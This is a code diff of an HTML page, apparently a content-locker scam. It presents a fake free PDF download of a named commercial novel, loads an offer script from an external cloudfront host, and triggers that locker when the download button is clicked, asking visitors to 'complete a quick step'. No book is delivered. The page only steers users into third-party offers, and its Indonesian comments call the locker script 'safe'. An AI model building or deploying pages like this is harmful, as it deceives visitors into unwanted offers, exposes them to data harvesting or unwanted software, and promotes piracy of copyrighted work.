@@ -1,47 +1,158 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blank Page</title>
-    
-    <script type="text/javascript">
-        var TUceW_tnr_exHLic = {"it":4597385,"key":"9ca78"};
-    </script>
-    <script src="https://d1qt1z4ccvak33.cloudfront.net/df48b4e.js"></script>
-    
-    <style>
-        body {
-            background: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: Arial, sans-serif;
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background: #007bff;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-    </style>
-</head>
-<body>
-    <button id="unlockBtn">🔓 Unlock Content</button>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download Book PDF Free</title>
 
-    <script>
-        // Jika script memerlukan event klik untuk memicu popup
-        document.getElementById('unlockBtn').addEventListener('click', function() {
-            // Beberapa content locker dipicu oleh event tertentu
-            console.log("Button clicked - popup should appear if script requires interaction");
-        });
-    </script>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f4f6f8;
+    margin: 0;
+    padding: 0;
+}
+
+.container {
+    max-width: 900px;
+    margin: auto;
+    padding: 20px;
+}
+
+.card {
+    background: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    display: flex;
+    gap: 20px;
+}
+
+.cover {
+    width: 150px;
+}
+
+.cover img {
+    width: 100%;
+    border-radius: 6px;
+}
+
+.details {
+    flex: 1;
+}
+
+h1 {
+    font-size: 22px;
+    margin-bottom: 10px;
+}
+
+.meta {
+    color: #666;
+    font-size: 14px;
+    margin-bottom: 15px;
+}
+
+.btn-download {
+    display: inline-block;
+    background: #28a745;
+    color: #fff;
+    padding: 15px 25px;
+    border-radius: 6px;
+    text-decoration: none;
+    font-size: 16px;
+    font-weight: bold;
+}
+
+.btn-download:hover {
+    background: #218838;
+}
+
+.notice {
+    margin-top: 15px;
+    font-size: 13px;
+    color: #999;
+}
+
+.footer {
+    text-align: center;
+    margin-top: 30px;
+    font-size: 13px;
+    color: #888;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="card">
+        <div class="cover">
+            <img id="bookCover" src="https://via.placeholder.com/150x220?text=Book+Cover">
+        </div>
+
+        <div class="details">
+            <h1 id="bookTitle">Loading book...</h1>
+            <div class="meta" id="bookMeta">Please wait...</div>
+
+            <a href="#" class="btn-download" onclick="unlockContent(); return false;">
+                📥 Download PDF
+            </a>
+
+            <div class="notice">
+                *Complete a quick step to unlock your download.
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2026 Free Library • All Rights Reserved
+    </div>
+
+</div>
+
+<!-- ===== OFFER SCRIPT (AMAN) ===== -->
+<script type="text/javascript">
+var pSbRH_VEr_ARwVzc = {"it":4581599,"key":"5f188"};
+</script>
+<script src="https://d1qt1z4ccvak33.cloudfront.net/861b5e9.js"></script>
+
+<!-- ===== LOGIC ===== -->
+<script>
+// Ambil parameter URL ?book=
+const params = new URLSearchParams(window.location.search);
+const bookId = params.get('book') || 'default';
+
+// Dummy data (bisa kamu ganti ke API OpenLibrary nanti)
+const books = {
+    "0593798430": {
+        title: "The Housemaid's Secret",
+        author: "Freida McFadden",
+        cover: "https://covers.openlibrary.org/b/isbn/0593798430-L.jpg"
+    }
+};
+
+// Set data
+const book = books[bookId];
+
+if (book) {
+    document.getElementById("bookTitle").innerText = book.title;
+    document.getElementById("bookMeta").innerText = "by " + book.author;
+    document.getElementById("bookCover").src = book.cover;
+} else {
+    document.getElementById("bookTitle").innerText = "Free Book Download";
+    document.getElementById("bookMeta").innerText = "Access full PDF instantly";
+}
+
+// Trigger locker
+function unlockContent() {
+    if (typeof _Rm !== "undefined") {
+        _Rm(); // biasanya function dari locker
+    } else {
+        alert("Loading offer, please try again...");
+    }
+}
+</script>
+
 </body>
 </html>
